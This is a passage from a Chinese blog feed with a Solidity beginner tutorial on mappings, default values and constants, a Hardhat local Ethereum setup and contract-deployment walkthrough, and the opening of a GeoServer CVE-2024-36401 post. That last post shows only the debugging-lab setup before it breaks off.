下面这个例子会报错</span><br><span class="line">    // 我们定义一个结构体 Struct</span><br><span class="line">    // struct Student&#123;</span><br><span class="line">    //    uint256 id;</span><br><span class="line">    //    uint256 score; </span><br><span class="line">    //&#125;</span><br><span class="line">    // mapping(Struct =&gt; uint) public testVar;</span><br><span class="line"></span><br><span class="line">    function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">        idToAddress[_Key] = _Value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="映射Mapping">映射Mapping</h4><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>），比如：通过一个人的<code>id</code>来查询他的钱包地址。</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h4 id="映射的规则">映射的规则</h4><ul><li><strong>规则1</strong>：**映射的<code>_KeyType</code>只能选择Solidity内置的值类型，比如<code>uint</code>，<code>address</code>等，不能用自定义的结构体。而<code>_ValueType</code>可以使用自定义的类型。**下面这个例子会报错，因为<code>_KeyType</code>使用了我们自定义的结构体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 我们定义一个结构体 Struct</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">mapping(Student =&gt; uint) public testVar;</span><br></pre></td></tr></table></figure><ul><li><p><strong>规则2</strong>：映射的存储位置必须是<code>storage</code>，因此可以用于合约的状态变量，函数中的<code>storage</code>变量和library函数的参数（见<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于<code>public</code>函数的参数或返回结果中，因为<code>mapping</code>记录的是一种关系 (key - value pair)。</p></li><li><p><strong>规则3</strong>：如果映射声明为<code>public</code>，那么Solidity会自动给你创建一个<code>getter</code>函数，可以通过<code>Key</code>来查询对应的<code>Value</code>。</p></li><li><p><strong>规则4</strong>：给映射新增的键值对的语法为<code>_Var[_Key] = _Value</code>，其中<code>_Var</code>是映射变量名，<code>_Key</code>和<code>_Value</code>对应新增的键值对。例子：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">    idToAddress[_Key] = _Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入<code>mapping</code>，并读取。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004147867.png" alt="image-20250125004147867"></p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004238778.png" alt="image-20250125004238778"></p><h4 id="映射的原理">映射的原理</h4><ul><li><strong>原理1</strong>: <strong>映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</strong></li><li><strong>原理2</strong>: 映射使用<code>keccak256(abi.encodePacked(key, slot))</code>当成offset存取value，其中<code>slot</code>是映射变量定义所在的插槽位置。</li><li><strong>原理3</strong>: 因为Ethereum会定义所有未使用的空间为0，所以<strong>未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是各个type的默认值</strong>，如uint的默认值是0。</li></ul><h2 id="变量初始化">变量初始化</h2><p>在<code>Solidity</code>中，声明但没赋值的变量都有它的初始值或默认值。这一讲，我们将介绍常用变量的初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract InitialValue &#123;</span><br><span class="line">    // Value Types</span><br><span class="line">    bool public _bool; // false</span><br><span class="line">    string public _string; // &quot;&quot;</span><br><span class="line">    int public _int; // 0</span><br><span class="line">    uint public _uint; // 0</span><br><span class="line">    address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">    ActionSet public _enum; // 第一个元素 0</span><br><span class="line"></span><br><span class="line">    function fi() internal&#123;&#125; // internal空白方程 </span><br><span class="line">    function fe() external&#123;&#125; // external空白方程 </span><br><span class="line"></span><br><span class="line">    // Reference Types</span><br><span class="line">    uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]</span><br><span class="line">    uint[] public _dynamicArray; // `[]`</span><br><span class="line">    mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping</span><br><span class="line">    // 所有成员设为其默认值的结构体 0, 0</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student public student;</span><br><span class="line"></span><br><span class="line">    // delete操作符</span><br><span class="line">    bool public _bool2 = true; </span><br><span class="line">    function d() external &#123;</span><br><span class="line">        delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="值类型初始值">值类型初始值</h3><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: 枚举中的第一个元素</p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</p></li><li><p><code>function</code></p><ul><li><p><code>internal</code>: 空白函数</p></li><li><p><code>external</code>: 空白函数</p></li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool public _bool; // false</span><br><span class="line">string public _string; // &quot;&quot;</span><br><span class="line">int public _int; // 0</span><br><span class="line">uint public _uint; // 0</span><br><span class="line">address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">ActionSet public _enum; // 第1个内容Buy的索引0</span><br><span class="line"></span><br><span class="line">function fi() internal&#123;&#125; // internal空白函数</span><br><span class="line">function fe() external&#123;&#125; // external空白函数 </span><br></pre></td></tr></table></figure><h3 id="引用类型初始值">引用类型初始值</h3><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组<code>array</code><ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Reference Types</span><br><span class="line">uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]</span><br><span class="line">uint[] public _dynamicArray; // `[]`</span><br><span class="line">mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping</span><br><span class="line">// 所有成员设为其默认值的结构体 0, 0</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">Student public student;</span><br></pre></td></tr></table></figure><h3 id="delete操作符"><code>delete</code>操作符</h3><p><code>delete a</code>会让变量<code>a</code>的值变为初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// delete操作符</span><br><span class="line">bool public _bool2 = true; </span><br><span class="line">function d() external &#123;</span><br><span class="line">    delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>值类型、引用类型<code>delete</code>操作后的默认值。</strong></p><h2 id="常数">常数</h2><p>这一讲，我们介绍Solidity中和常量相关的两个关键字，<code>constant</code>（常量）和<code>immutable</code>（不变量）。状态变量声明这两个关键字之后，不能在初始化后更改数值。这样做的好处是提升合约的安全性并节省<code>gas</code>。</p><p>另外，只有数值变量可以声明<code>constant</code>和<code>immutable</code>；<code>string</code>和<code>bytes</code>可以声明为<code>constant</code>，但不能为<code>immutable</code>。</p><p>测试代码<code>Constant.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Constant &#123;</span><br><span class="line">    // constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">    uint256 public constant CONSTANT_NUM = 10;</span><br><span class="line">    string public constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">    bytes public constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">    address public constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">    // immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">    uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">    address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">    uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">    uint256 public immutable IMMUTABLE_TEST;</span><br><span class="line"></span><br><span class="line">    // 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">        IMMUTABLE_NUM = 1118;</span><br><span class="line">        IMMUTABLE_TEST = test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test() public pure returns(uint256)&#123;</span><br><span class="line">        uint256 what = 9;</span><br><span class="line">        return(what);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="constant和immutable">constant和immutable</h3><h4 id="constant">constant</h4><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">uint256 constant CONSTANT_NUM = 10;</span><br><span class="line">string constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">bytes constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br></pre></td></tr></table></figure><h4 id="immutable">immutable</h4><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。在<code>Solidity v8.0.21</code>以后，<code>immutable</code>变量不需要显式初始化。反之，则需要显式初始化。 若<code>immutable</code>变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">uint256 public immutable IMMUTABLE_TEST;</span><br></pre></td></tr></table></figure><p>你可以使用全局变量例如<code>address(this)</code>，<code>block.number</code> 或者自定义的函数给<code>immutable</code>变量初始化。在下面这个例子，我们利用了<code>test()</code>函数给<code>IMMUTABLE_TEST</code>初始化为<code>9</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">constructor()&#123;</span><br><span class="line">    IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">    IMMUTABLE_NUM = 1118;</span><br><span class="line">    IMMUTABLE_TEST = test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() public pure returns(uint256)&#123;</span><br><span class="line">    uint256 what = 9;</span><br><span class="line">    return(what);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125011902342.png" alt="image-20250125011902342"></p><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac搭建hardhat以太坊开发环境</title>
      <link href="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Node环境配置">Node环境配置</h2><p>首先安装<code>nvm</code>，再安装<code>node18</code>，为了和<code>hardhat</code>的运行环境匹配</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nvm</span><br></pre></td></tr></table></figure><p>配置nvm环境，在<code>～/.zshrc</code>中加入下面的内容。</p><p>编辑<code>～/.zshrc</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/nvm.sh&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>保存，并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>配置好后，如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214138233.png" alt="image-20250113214138233"></p><p>接下来，安装<code>node18</code>，使用下面命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install 18</span><br></pre></td></tr></table></figure><p>如下，安装成功。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214511440.png" alt="image-20250113214511440"></p><h2 id="搭建hardhat环境">搭建hardhat环境</h2><p>创建一个目录，专门用于以太坊学习，随意，如<code>/Web3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /Web3</span><br><span class="line">mkdir hardhat-simple-contract</span><br><span class="line">cd hardhat-simple-contract</span><br><span class="line">npm init -y</span><br><span class="line">npm install --save-dev hardhat</span><br></pre></td></tr></table></figure><p>然后初始化<code>hardhat</code>项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat</span><br></pre></td></tr></table></figure><p>选择第一个创建一个<code>JavaScript project</code>，项目路径选择刚开始创建文件夹的路径。</p><p>注意⚠️我这里是换了一个路径演示一下。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113232445250.png" alt="image-20250113232445250"></p><p>初始化后的文件目录如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113234740753.png" alt="image-20250113234740753"></p><p>其中的<code>scripts</code>文件夹需要自己创建。</p><h2 id="部署智能合约">部署智能合约</h2><p>进入到文件夹<code>contracts</code>下，创建合约文件<code>SimpleStorage.sol</code>，简单的部署一个合约，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint256 private storedValue;</span><br><span class="line"></span><br><span class="line">    event ValueChanged(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    function set(uint256 value) public &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">        emit ValueChanged(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint256) &#123;</span><br><span class="line">        return storedValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入到创建的<code>scripts</code>文件夹下，创建部署合约的脚本<code>deploy.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取合约工厂</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractFactory</span>(<span class="string">&quot;SimpleStorage&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 部署合约</span></span><br><span class="line">    <span class="keyword">const</span> simpleStorage = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">deploy</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 等待部署完成</span></span><br><span class="line">    <span class="keyword">await</span> simpleStorage.<span class="title function_">waitForDeployment</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取合约地址</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`SimpleStorage deployed to: <span class="subst">$&#123;simpleStorage.target&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">main</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">      process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>首先需要对编写的智能合约进行编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>编译成功后，会输出<code>Compiled 2 Solidity files successfully (evm target: paris)</code></p><p>然后启动本地的以太坊网络，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113221945116.png" alt="image-20250113221945116"></p><p>以太坊网络启动成功。</p><p>进行合约的部署，执行部署的js文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113222224915.png" alt="image-20250113222224915"></p><p>合约成功部署，得到部署合约的地址<code>0x5fbdb2315678afecb367f032d93f642f64180aa3</code>。</p><h2 id="调用合约函数">调用合约函数</h2><p>创建一个调用合约的代码<code>test.js</code>，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scripts/test.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;SimpleStorage&quot;</span>, <span class="string">&quot;0x5fbdb2315678afecb367f032d93f642f64180aa3&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在这里继续编写脚本逻辑，例如读取或调用合约方法</span></span><br><span class="line">    <span class="keyword">const</span> value = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">set</span>(<span class="number">42</span>); <span class="comment">// 假设你的合约有一个 `get` 方法</span></span><br><span class="line">    <span class="comment">//const value = await SimpleStorage.get()</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Stored value:&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获错误</span></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    process.<span class="property">exitCode</span> = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其保存在<code>scripts</code>文件夹下。</p><p>代码的大致意思是，调用合约的<code>set</code>函数方法，设置值为<code>42</code>，然后再调用<code>get</code>方法去读取数据。</p><p>先是调用<code>set</code>方法，如图所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/test.js  --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235445672.png" alt="image-20250113235445672"></p><p>然后再调用<code>get</code>方法，获取<code>set</code>的值。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235806214.png" alt="image-20250113235806214"></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeoServer代码执行漏洞(CVE-2024-36401)</title>
      <link href="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/"/>
      <url>/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/</url>
      
        <content type="html"><![CDATA[<h2 id="配置调试环境">配置调试环境</h2><p>调试漏洞的GeoServer版本号为2.23.2，获取源代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geoserver/geoserver #下载</span><br><span class="line">git tag #查看全部的版本</span><br><span class="line">git checkout tags/2.23.2 #切换至2.23.2版本</span><br></pre></td></tr></table></figure><p>使用vulhub进行漏洞的远程调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/vulhub/geoserver/CVE-2024-36401/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>IntelliJ IDEA打开geoserver的源代码，添加运行Remote JVM Debug，端口默认为5005。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109204237470.png" alt="image-20250109204237470"></p><p>然后对代码进行断点调试。</p><h2 id="浅析代码">浅析代码</h2><h3 id="官方通告">官方通告</h3><p>漏洞通告：</p><p><a 